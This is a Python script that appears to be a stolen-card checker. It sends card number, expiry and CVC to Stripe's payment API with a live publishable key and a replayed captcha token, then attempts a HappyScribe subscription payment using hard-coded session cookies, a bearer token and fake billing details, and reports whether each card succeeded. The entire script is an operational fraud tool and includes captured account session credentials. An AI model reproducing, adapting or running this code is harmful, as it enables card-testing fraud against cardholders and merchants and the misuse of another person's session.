import requests
import re
import random
import time
import user_agent
import string
from fake_useragent import UserAgent
import base64
from bs4 import BeautifulSoup
from faker import Faker
def st(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	data = f'type=card&billing_details[name]=Mero+AYman&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=ee60166f-108d-4007-a40e-cefc269400b0297ce7&muid=83b8dc64-33b5-409f-ae82-2c915215ef5be41e4f&sid=bfa10f46-91a4-4bbc-b16a-6fe23809c9492bb25c&pasted_fields=number&payment_user_agent=stripe.js%2F93fe8dba76%3B+stripe-js-v3%2F93fe8dba76%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=27328&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYvpDOImzYNJTzaYP1S8e-ZXq3K0E2XrRzmJ59ObDLSZMj1xnXsJmscC9fyoZ1-8BNy-inMhhQJeOIDXvWKlxdr6UWOoUj8HGDJ7lQLLYOveX68db23iKJAZDaCJRcYP33FZyaY6VyMEFQSfjuL5uxrWPicFHo13np_5bEUxkxSTNA4C0qAOc49vyhDrmpBjo1yo38gXXPCc2cZjG-se0O8g-z06YIunBFdyXw8M8ZI1YrzWudej8FyW5U-iWFFHHXEPo0VYd7KQEKz2FGTCBSwvcrEkDVXJKsKN37rLpG5dfyg4gDW-29GfjVFg-HiA6gPfA78lqNq2Onjn4BOkEp1IZG9lKN1TlN4WoYkTR7kbFnfTCxfDbB-Ndep7t8xlN8TBb4oyPDIq2Ce5ATs4xUiDDMsRDX3DoR7NFVRrJs4QoAlAv6mgElTQkrrJ-X9lK8Zdo39i_Ujf_yvlOOXVARf68alb47h5bBm31K-HE6Ic8ElOd0ATGOmR_vuo_q-SO_9tevlXsZISExR_z6aFLjHe5afCo2XAjhW2IgxMDzZa8U6MBksJn-tH002x3bbMMVQFVC0PWWdybpYCI7DZEIpwFZW4UvFI2WNKB91wGWD4Twh0_JnyrWeGPx5gy4tpGQm4-vX32rx2YezaPncqxfZ93GMB1vhMwEXToO7X6drsqqku_W3tF-gMzmCZnUgainhMMcLL6DM-ZO160k_3Vb9GnNJKtmTNVDdGp5jhCiGq9lKHlTmJmdaaPzv-qGPh6M0dcY5qiC0gr_aDhrdYU6uNnYbH5FvE0u91hIy6J7n8lhVDnw_mwd4yAcsROhiDtO1hrs4bpJcKQ3tQhiEZLdZLWisq9bT6FnH2omeYXbYZZt47TitKVcT5xiALxr0q8woGjcHt8OcFAqq5pHL2I7V3MoyAJV_lItRpRvBYc5IoTWWF50jt3ZhPK7l7K8WJJAUL8buKTcrkjXhRRdcMJ1N4AAjajcA9CuK8awagbpETlXWdxT7JcDLADBrqbFyvZKTd9QQms8IWCcULuBFmMsZsr160sps25eA3cbmW58GNXJ8XEKA6qIAfdBUgZt8l3uJjxHu_u5Wq4JWhZ4eRcU2lvFHpvIhFDiWDuvR_LacBJKVeBawrERWidbZc1SXC9u5CbIC8dgzy3E-BZIPsDKXt8onEtNyO7dObIQkFXqWJSxIMTzCu26wI10ASjge7hJqtnDra3mHPFDjJ-SZ8jWLct4aTz0dMhXTCM230Pi4q58tV2IQOo_rawoWVEK17UOivNdyCZENYrPY0rhSSg7bx2upMp5WwhnLdz_MJj-dj6RFlkjbU0UthD1DuMrA1_hDPfeWPvVOu3Z0txYEyNrN9BtNpmJ1ZWaeVzgLkbqt5SZgb6D9a828Hm6V8uO29SNuiluiDLSlyy904onWChkoeDweg0iSIwideZ7Wl9PRpaTOsLbXj9kdsya4KDNOP46jktEfhRX3khANDFOJ-a1RKEXFag0Co7xJ2wiVmsMS4xYfN9kV5MzYVeKes5_3h4DiwSA3V9PC6H2IBWgBskC_YH7V3ICsO1TNfjgiF-Jx7XQeECTwqxTMiYp90M5Ry64RAyvyoNp1pZ9CN11lOY1lHLLLekKlKYEX6Uf4bCBuYwMM_5-sxN8Mj3t7OH5K8puM_GTIZZI1scXfESx-ZFcBvxBOKBN3L6H93PId_SBzy1R88pGx4Eu6cndTOyC0MoC-91PhRmgoI4CBsX0o9sPOPcK3QmAqw9VqfBaY3u7cUVXiIDNjJYCFh3xAy34tOmujP4VieUGsMw8Mue_mtgYPafLSGgpSPiqmgCqdqqiphGPnXj4tsuFl01f8PQ0mpRCPOIVO1ZBPrCgH2xAIP11NHk4DyvB1Kp_zfV9Tda-AJeCD9WDlakdytmYjnPBqNC0CmYCCWsSKzb_XN4-L0jXuikCxXRgonqZJnAFfC7gPbGHb5CpvrO6nHFfGr5MTwjDRNgXlCOZrwTEsIkluku6uGRcgK9xTySmhTfi1vfNn6_PZ64xTpSlvO5Td1uWBFlQaAAAhcF9jrN85f0gDMYU_9Wn3uuujHcW1VTILShx34sRSAcIl3v53BtLnk5CqXIejZXhwzmag7U-oc2hhcmRfaWTOAzGDb6JrcqgxYTY2NTBlMqJwZAA.vb3hEGXddv2OmbgWr5vlVivRZ6qqLqLGxGnGbN0uEZU'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	import requests
	
	cookies = {
	    'timezone': 'Africa%2FCairo',
    'ahoy_visit': '5cd595b2-cb18-4735-899a-b094e76b3b5f',
    'ahoy_visitor': 'ed76357e-75a3-4eb6-b9d8-13ea327285b6',
    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-07-27T11%3A15%3A25.277Z%22%2C%22consentId%22%3A%22c133a8b9-ed52-4980-a8d0-9b43e7cebf94%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-07-27T11%3A15%3A25.277Z%22%7D',
    '_gcl_au': '1.1.248267385.1722078925',
    '_gid': 'GA1.2.344655711.1722078925',
    'unsecure_is_signed_in': '1',
    '__stripe_mid': '6ac9634e-691f-4529-b32d-5d99b55d6d9da4c28e',
    '__stripe_sid': '4e33f23b-3265-4d58-a98a-635ebf8d3f5d26b4a6',
    '_cioid': '12605984',
    '_ga': 'GA1.2.1579055628.1722078919',
    'intercom-device-id-frdatdus': '3db9f589-3a5a-43b5-b7a1-1fa78b66fd22',
    '_ga_4T8KCV9Y2D': 'GS1.1.1722078919.1.1.1722079553.49.0.0',
    'intercom-session-frdatdus': 'NnM4MEhOQk1pRDlyU1lxNWJrVnBrbmpnc3lOR0dJK2UrQUlqRjdNSkZOZGp5U1liU2R4M0ZmL2lnaFpaYzBtVC0tTzlGb2lEK29UMTdYZmtYcHBwZXp1dz09--d2f3d983eb1c0b469e027334bfdd4b5a970c8b8b',
    '_transcribe_session': 'C53rakKE3wnRqr023pJcPWppsTqkKrE93pSQGfqo9LMvd0R6OT32WgxWM1pLTXpTtbhlTQMKuaNiRFt4xJJFv68lUnwyPCeP1TJJvNB9P%2FReOpgdQCUe0jcfLQqE4im2nMNLY1nchBGSPLKdanjKMQseKiHFEDJLkTjwlJ0qERQuFdlFvSWE7pMDftVBmYZybJVy291TRQyxG5PYQ0n%2B%2FJuRkP7TqFv9suB0jFam3JrzmPjxwxUjFu%2BQBoQwhTGEuAKCoBlMd8gxVkhEFVX%2B0wLLOTBbKLUNSSXIdJRcukWsKgnZ%2Fe0K0%2BNhXVk1TbVjaxIYr5eDPpe3cqd3DU7KVctTK%2FPk7SHM1LazDp0nZfHFOi826iTfqvjmQ7IPhR1aqpLwm5olI7fnZvW4XY0aybqyTQ%3D%3D--0BiBQ4RLCfHiEfT2--jEZTd3zudtoJfXfQvEJ9%2Bw%3D%3D',
}
	
	headers = {
	
	'authority': 'www.happyscribe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer cZ38DQVhhg0wArP8lZsbZAtt',
    'content-type': 'application/json',
    # 'cookie': 'timezone=Africa%2FCairo; ahoy_visit=5cd595b2-cb18-4735-899a-b094e76b3b5f; ahoy_visitor=ed76357e-75a3-4eb6-b9d8-13ea327285b6; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-07-27T11%3A15%3A25.277Z%22%2C%22consentId%22%3A%22c133a8b9-ed52-4980-a8d0-9b43e7cebf94%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-07-27T11%3A15%3A25.277Z%22%7D; _gcl_au=1.1.248267385.1722078925; _gid=GA1.2.344655711.1722078925; unsecure_is_signed_in=1; __stripe_mid=6ac9634e-691f-4529-b32d-5d99b55d6d9da4c28e; __stripe_sid=4e33f23b-3265-4d58-a98a-635ebf8d3f5d26b4a6; _cioid=12605984; _ga=GA1.2.1579055628.1722078919; intercom-device-id-frdatdus=3db9f589-3a5a-43b5-b7a1-1fa78b66fd22; _ga_4T8KCV9Y2D=GS1.1.1722078919.1.1.1722079553.49.0.0; intercom-session-frdatdus=NnM4MEhOQk1pRDlyU1lxNWJrVnBrbmpnc3lOR0dJK2UrQUlqRjdNSkZOZGp5U1liU2R4M0ZmL2lnaFpaYzBtVC0tTzlGb2lEK29UMTdYZmtYcHBwZXp1dz09--d2f3d983eb1c0b469e027334bfdd4b5a970c8b8b; _transcribe_session=C53rakKE3wnRqr023pJcPWppsTqkKrE93pSQGfqo9LMvd0R6OT32WgxWM1pLTXpTtbhlTQMKuaNiRFt4xJJFv68lUnwyPCeP1TJJvNB9P%2FReOpgdQCUe0jcfLQqE4im2nMNLY1nchBGSPLKdanjKMQseKiHFEDJLkTjwlJ0qERQuFdlFvSWE7pMDftVBmYZybJVy291TRQyxG5PYQ0n%2B%2FJuRkP7TqFv9suB0jFam3JrzmPjxwxUjFu%2BQBoQwhTGEuAKCoBlMd8gxVkhEFVX%2B0wLLOTBbKLUNSSXIdJRcukWsKgnZ%2Fe0K0%2BNhXVk1TbVjaxIYr5eDPpe3cqd3DU7KVctTK%2FPk7SHM1LazDp0nZfHFOi826iTfqvjmQ7IPhR1aqpLwm5olI7fnZvW4XY0aybqyTQ%3D%3D--0BiBQ4RLCfHiEfT2--jEZTd3zudtoJfXfQvEJ9%2Bw%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'referer': 'https://www.happyscribe.com/v2/12106466/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
    'save-data': 'on',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	json_data = {
    'id': 11785538,
    'address': 'Ushsjsu',
    'name': 'アイリーンおじ',
    'country': 'US',
    'vat': 'Hshsusu',
    'billing_account_id': 11785538,
    'last4': '4670',
    'orderReference': 'bzzty',
    'user_id': 12605984,
    'organization_id': 12106466,
    'hours': 0,
    'balance_increase_in_cents': None,
    'payment_method_id': id,
    'transcription_id': None,
    'plan': 'basic_2023_05_01',
    'order_id': None,
    'recurrence_interval': 'month',
    'extra_plan_hours': None,
}
	
	response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
	if '"success":true' in response.text or "Payment success" in response.text or "success" in response.text or "Payment Completed." in response.text or "Thank you for your support." in response.text or "Success" in response.text or "Thank you" in response.text or "succedd" in response.text:
		return '3d'
	else:
		return 'Your card was declined.'